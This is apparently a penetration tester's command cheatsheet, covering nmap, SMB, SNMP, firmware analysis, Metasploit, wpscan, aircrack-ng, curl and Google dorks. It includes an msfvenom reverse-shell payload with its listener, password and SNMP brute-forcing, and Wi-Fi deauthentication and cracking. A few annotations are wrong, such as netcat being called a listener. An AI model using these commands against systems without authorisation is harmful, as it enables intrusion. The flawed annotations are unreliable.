# CHEATSHEETS

# Reporting
## Directory structure
mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,'AD Enumeration'},Notes,OSINT,Wireless,'Logging output','Misc Files'},Retest}

# Access

## SSH
ssh <user>@<host>

## RDP
### xfreerdp
xfreerdp /v:<ip> /u:<user> /p:<password>  # Connects to a remote Windows machine via RDP, specifying the target IP, username and password
xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution /cert:ignore  # Connects to a remote Windows machine via RDP; resizes the session on window resize and skips certificate validation prompts

### Encrypton 
ssh-keygen -t rsa -b 2048  # Generates a 2048-bit RSA SSH key pair for passwordless authentication
ssh-copy-id user@backup_server  # Copies your public SSH key to a remote server, enabling passwordless login.
ftp -p <host> <port> <username> <pass> # FTP connection in passive mode. <port>, <username> and <pass> are optional

# Backup

## rsync
rsync -av /path/to/mydirectory user@backup_server:/path/to/backup/directory # Recursively copies a local directory to a remote server over SSH, preserving file attributes and displaying verbose output
rsync -av user@remote_host:/path/to/backup/directory /path/to/mydirectory  # Pulls a directory from a remote server to a local destination, preserving file attributes and displaying verbose output
rsync -avz -e ssh /path/to/mydirectory user@backup_server:/path/to/backup/directory  # Syncs a local directory to a remote server explicitly over SSH with compression enabled
rsync -avz --backup --backup-dir=/path/to/backup/folder --delete /path/to/mydirectory user@backup_server:/path/to/backup/directory # Syncs a local directory to a remote server over SSH with compresion, moves overwritten/deleted files to a backup folder, and removes files on the destination that no longer exist at the source
rsync -avz -e ssh /path/to/mydirectory user@backup_server:/path/to/backup/directory  # Syncs a local directory to a remote server explicitly over SSH with compression enabled

## Crontab
crontab -e  # Opens the current user's crontab file in the default editor for scheduling automated tasks
* * * * * /path/to/file.sh # Every minute (m=*), every hour (h=*), every day of the month (d=*), every month (M=*), every day of the week (w=*)

# Terminal

## Tmux
prefix: Ctrl+B

### Sessions
#### Session management
tmux new -s <name> # New named session
Ctrl+B $ # Rename session
Ctrl+B d # Detach session
Ctrl+B s # List / switch sessions

#### TPM & plugins
Prefix + Shift+I # Install plugins
Prefix + Shift+P # Purge removed plugins
Prefix + Alt+P #Previous plugin
Prefix + Alt+Shift+P #Update plugins

### Panes & windows
#### Splitting & navigation
Prefix + Shift+% # Split pane vertically
Prefix + Shift+" # Split pane horizontally
Prefix + o # Cycle to next pane
Prefix + Alt+C # New window

#### Misc & copy mode
Ctrl+G # Cancel / abort prompt
Ctrl+S # Save session (tmux-resurrect)
Ctrl+X #Restore session (tmux-resurrect)
Prefix + Ctrl+@ # Join pane
Prefix + Ctrl+! # Break pane to new window

## Vim

### Modes
#### Mode switching
i # Insert before cursor
I # Insert at line start
a # Append after cursor
A # Append at line end
o # New line below
O # New line above
v # Visual mode
V # Visual line mode
Ctrl+V # Visual block mode
: # Command-line mode
R # Replace mode
Esc # Back to normal mode

### Motion
#### Character & word
h j k l # ←↓↑→
w / W # Next word / WORD
b / B # Prev word / WORD
e / E # End of word / WORD
0 / $ # Line start / end
^ # First non-blank char

#### File & screen
gg / G # File start / end
:N # Go to line N
Ctrl+D / U # Half-page down / up
Ctrl+F / B # Full-page down / up
% # Jump to matching bracket
zz # Centre line on screen

### Editing
#### Delete, change, yank
x # Delete char under cursor
dd # Delete line
dw # Delete word
DD # Delete to end of line
cc # Change line
cw # Change word
yy # Yank (copy) line
yw # Yank word
p / P # Paste after / before

#### Undo, redo & repeat
u # Undo
Ctrl+R # Redo
. # Repeat last change
r # Replace single char
~ # Toggle case
J # Join line below
>> / << # Indent / de-indent
Ctrl+A # Increment number

### Search & replace
#### Search
/pattern # Search forward
?pattern # Search backward
n / N # Next / prev match
* / # # Word under cursor ↓ / ↑
:noh # Clear highlights

#### Substitute
:s/old/new # Replace first on line
:s/old/new/g # Replace all on line
:%s/old/new/g # Replace all in file
:%s/old/new/gc # Replace with confirm

### File & buffers
#### Save & quit
:w # Save
:wq / ZZ # Save and quit
:q! / ZQ # Quit without saving
:wa # Save all buffers
:e <file> # Open file

#### Windows & splits
:sp # Horizontal split
:vsp # Vertical split
Ctrl+W W # Switch split
Ctrl+W +/- # Resize split
:bnext / :bprev # Next / prev buffer

### Marks, macros & tips
#### Marks & jumps
m{a-z} # Set mark
'{a-z} # Jump to mark
Ctrl+O / I # Prev / next jump
gi # Return to last insert

#### Macros
q{a-z} # Start recording macro
q # Stop recording
@{a-z} # Play macro
@@ # Replay last macro
N@{a} # Run macro N times

# Banner Grabbing

netcat <target> <port> # Listens on a TCP port (bind shell listener)
ncat <target> <port>
nc <target> <port>
nc -nv <target> <port>

# Scan

## nmap
nmap <target> # Only scan the 1000 most common ports by default.
nmap -sV -sC -p- <target> # Full TCP port scan with service discovery and default scripts
nmap -sC -sV -vv -O -p- -oA <file> <target> # Full TCP port scan with service/version detection, default scripts, OS detection, verbose output, and saved results in all formats.
nmap --script <script name> -p<port> <target> # Runs a specific NSE script against a chosen port on the target host
nmap -sV --script=banner <target> # Detects running services and retrieves service banners from the target
nmap -A -p <ports> <target> # Performs aggressive scanning (OS detection, version detection, scripts, traceroute) on specified ports.

## smb
smbclient -N -L \\\\<target> # Lists available SMB shares on the target host without authentication.
smbclient \\\\<target>\\<smb share> # Accesses a specific SMB share on the target.
smbclient -U <user> \\\\<target>\\<smb share> # Authenticates to an SMB share using a specific user account.

## SNMP
snmpwalk -v <version> -c <community> <target> <OID> # Queries an SNMP device using a specified SNMP version and community string to retrieve the value of a given OID.
onesixtyone -c <community_list> <target> # Brute-forces SNMP community strings on the target host.

## Firmware Analysis
### Binwalk
binwalk <file> # Scans a file for embedded signatures (filesystems, compression, executables, etc.)
binwalk -e <file> # Extracts identified files/data automatically to a folder
binwalk -Me <file> # Recursively scans and extracts nested/embedded content (matryoshka mode)
binwalk -B <file> # Signature scan only (raw magic byte detection), no extraction
binwalk -A <file> # Scans for executable code / CPU architecture signatures
binwalk -E <file> # Runs entropy analysis to spot compressed or encrypted regions
binwalk --dd='.*' <file> # Extracts all identified data blocks regardless of file type
binwalk -Y <file> # Scans for YARA rule matches (custom pattern signatures)

### Firmadyne
./sources/extractor/extractor.py -b <brand> -sql 148.166.71.1 -np -nk <firmware.bin> images/ # Extracts filesystem and metadata from a firmware image into the firmadyne database
./scripts/getArch.sh <extracted.tar.gz> # Identifies target CPU architecture of the extracted firmware
./scripts/tar2db.py -i <image_id> -b <brand> -f <extracted.tar.gz> # Loads extracted firmware image info into the firmadyne SQL database
./scripts/makeImage.sh <image_id> # Builds an emulatable QEMU disk image from the extracted firmware
./scripts/getNetwork.sh <image_id> # Identifies network interfaces used by the firmware for emulation
./scripts/inferNetwork.sh <image_id> # Infers network configuration needed to boot firmware with correct interfaces
./scratch/<image_id>/run.sh # Boots the firmware image in QEMU for dynamic analysis/emulation

# Penetration testing

## Metasploit
use exploit/multi/handler # Starts a Metasploit listener to catch incoming reverse shell connections from a deployed payload.
set payload windows/meterpreter/reverse_tcp # Sets the payload to match the one used when generating the executable.
set LHOST <Attacker's IP Address> # Specifies the attacker's IP address to listen on.
set LPORT <Attacker's Port Number> # Specifies the port to listen on for the incoming connection.
exploit  # Launches the handler and awaits the reverse connection from the target.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker's IP Address> LPORT=<Attacker's Port Number> -f exe -o /path/to/output/payload.exe  # Generates a Windows Meterpreter reverse TCP payload as an executable, connecting back to the specified IP address and port upon execution.

### Meterpreter Commands
sysinfo  # To view the victim's system information
shell  # To access the command line on the victim's computer
screenshot  # To take a screenshot of the victim's screen´

## Wpscan

wpscan -e p --url <target> --disable-tls-checks --no-banner --plugins-detection aggressive -t 100 # Enumerates installed WordPress plugins (aggressive detection), ignores TLS cert errors, with 100 concurrent threads
wpscan --url <target> # Performs a basic WordPress scan (version, readme, theme, headers)
wpscan --url <target> -e vp,vt # Enumerates only vulnerable plugins and vulnerable themes
wpscan --url <target> -e u # Enumerates WordPress usernames
wpscan --url <target> -e ap,at,tt # Enumerates all plugins, all themes, and timthumb files
wpscan --url <target> --api-token <token> # Runs a scan with vulnerability database lookups via WPScan API (requires free/paid API token)
wpscan --url <target> -U <userlist> -P <passwordlist> # Performs a login brute-force attack using supplied username and password lists
wpscan --url <target> -U admin -P <passwordlist> --max-threads 50 # Brute-forces the admin account's password with 50 concurrent threads
wpscan --url <target> --enumerate u1-100 # Enumerates users by ID range (useful when default user listing is disabled)
wpscan --url <target> --random-user-agent # Randomizes the User-Agent header per request to reduce fingerprinting/blocking

# Wireless

## Aircrack-ng suite
airmon-ng start wlan0 # Puts the wireless interface into monitor mode
airodump-ng wlan0mon # Scans and lists nearby access points and connected clients
airmon-ng check # Lists processes that may interfere with monitor mode
airmon-ng check kill # Kills those interfering processes so monitor mode works cleanly
airodump-ng -c <channel> --bssid <BSSID> -w <file> wlan0mon # Captures traffic/handshakes for a specific target AP
aireplay-ng --deauth <count> -a <BSSID> -c <client MAC> wlan0mon # Sends deauth packets to force a client to reconnect (capture handshake)
aircrack-ng -w <wordlist> -b <BSSID> <capture file> # Cracks a captured WPA/WPA2 handshake using a wordlist
airmon-ng stop wlan0mon # Stops monitor mode and restores managed mode

# Web Enumeration

## Gobuster
gobuster dir -u <target> -w <file> # Performs directory brute-forcing.

# MAC Address Spoofing

## Network Interface Management
sudo ifconfig eth0 down # Disables the eth0 network interface so changes can be applied.
sudo ifconfig eth0 up # Re-enables the eth0 network interface after changes are made

## MAC Changer
sudo macchanger -m <mac address> eth0 # Changes the MAC address of eth0 to the specified value.
macchanger -s eth0 # Displays the current and original MAC address of eth0.

# URL
## Curl
curl -v <target> # Sends a verbose HTTP request, displaying headers and connection details
curl -I <target> # Sends a HEAD request, showing only response headers (quick banner/tech check)
curl -X POST -d "user=admin&pass=admin" <target> # Sends a POST request with URL-encoded form data
curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' <target> # Sends a POST request with a JSON body
curl -H "Header: value" <target> # Adds a custom HTTP header to the request
curl -A "<user-agent string>" <target> # Sets a custom User-Agent (useful for bypassing basic UA filtering)
curl -b "session=<cookie value>" <target> # Sends a request with a specified cookie
curl -c cookies.txt <target> # Saves response cookies to a file
curl -L <target> # Follows HTTP redirects automatically
curl -k <target> # Ignores SSL/TLS certificate validation errors
curl -o <file> <target> # Saves the response body to a local file
curl -u <user>:<pass> <target> # Sends a request with HTTP Basic Authentication
curl -x <proxy>:<port> <target> # Routes the request through a specified proxy 
curl --resolve <domain>:<port>:<ip> <target> # Forces resolution of a hostname to a specific IP (useful for virtual host testing)
curl -s -o /dev/null -w "%{http_code}\n" <target> # Silently fetches and prints only the HTTP status code
curl -v --http1.1 <target> # Forces the request to use HTTP/1.1 (useful for spotting protocol-related quirks)

# OSINT

## Spiderfoot
spiderfoot -l <ip>:<port>  # Starts the SpiderFoot web interface and listens on the specified IP address and port.

## Google Dorks

| #  | Dork        | Description                                               | Usage Example               |
| :- | :---------- | :-------------------------------------------------------- | :-------------------------- |
| 1  | site:       | Searches within a specific site.                          | site:example.com            |
| 2  | filetype:   | Searches for a specific file type.                        | filetype:pdf                |
| 3  | intitle:    | Searches for pages with specific words in the title.      | intitle:"login"             |
| 4  | inurl:      | Searches for pages with specific words in the URL.        | inurl:admin                 |
| 5  | cache:      | Displays pages stored in Google's cache.                  | cache:example.com           |
| 6  | link:       | Finds pages that link to a specific page.                 | link:example.com            |
| 7  | related:    | Finds sites similar to a specific site.                   | related:example.com         |
| 8  | intext:     | Searches for specific words within the page text.         | intext:"password"           |
| 9  | allintitle: | Searches for pages with all specified words in the title. | allintitle:login admin      |
| 10 | allinurl:   | Searches for pages with all specified words in the URL.   | allinurl:admin login        |
| 11 | allintext:  | Searches for pages with all specified words in the text.  | allintext:username password |
| 12 | define:     | Searches for the definition of a specific word.           | define:OSINT                |
| 13 | "keyword"   | Searches for an exact phrase.                             | "admin login"               |
| 14 | -keyword    | Excludes pages containing a specific word.                | password -example           |
| 15 | OR          | Searches for pages containing either of two words.        | login OR signup             |
| 16 | *           | Acts as a wildcard for any word.                          | intitle:"admin *"           |
| 17 | ..          | Searches for numbers within a range.                      | filetype:pdf 2020..2022     |
| 18 | info:       | Displays information about a specific site.               | info:example.com            |
| 19 | maps:       | Shows the map of a specific location.                     | maps:New York               |
| 20 | stocks:     | Shows stock information for a specific company.           | stocks:GOOG                 |


